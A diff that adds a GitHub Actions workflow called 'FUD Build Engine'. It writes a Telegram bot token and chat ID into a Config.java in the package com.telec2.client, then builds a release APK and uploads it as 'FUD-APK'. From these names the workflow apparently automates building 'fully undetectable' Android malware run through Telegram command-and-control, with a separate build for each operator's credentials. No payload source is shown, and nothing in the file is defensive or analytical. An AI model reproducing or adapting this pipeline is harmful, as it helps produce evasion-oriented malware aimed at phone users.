@@ -1,0 +1,40 @@
+name: 🔥 FUD Build Engine
+
+on:
+  workflow_dispatch:
+    inputs:
+      bot_token:
+        description: 'TG Bot Token'
+        required: true
+      chat_id:
+        description: 'TG Chat ID'
+        required: true
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      
+      - name: Setup JDK 17 + Android SDK
+        uses: android-actions/setup-android@v3
+      
+      - name: Create Config File
+        run: |
+          mkdir -p app/src/main/java/com/telec2/client
+          echo "package com.telec2.client;
+          public class Config {
+              public static final String BOT_TOKEN = \"${{ github.event.inputs.bot_token }}\";
+              public static final String CHAT_ID = \"${{ github.event.inputs.chat_id }}\";
+          }" > app/src/main/java/com/telec2/client/Config.java
+      
+      - name: Build APK
+        run: |
+          chmod +x gradlew
+          ./gradlew assembleRelease
+      
+      - name: Upload APK
+        uses: actions/upload-artifact@v4
+        with:
+          name: FUD-APK
+          path: app/build/outputs/apk/release/*.apk
